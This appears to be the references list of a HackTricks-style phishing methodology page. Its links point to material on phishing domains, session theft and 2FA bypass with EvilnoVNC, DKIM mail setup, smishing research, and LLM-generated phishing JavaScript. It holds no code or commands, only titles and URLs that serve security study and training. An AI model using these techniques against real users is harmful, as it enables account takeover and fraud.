- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
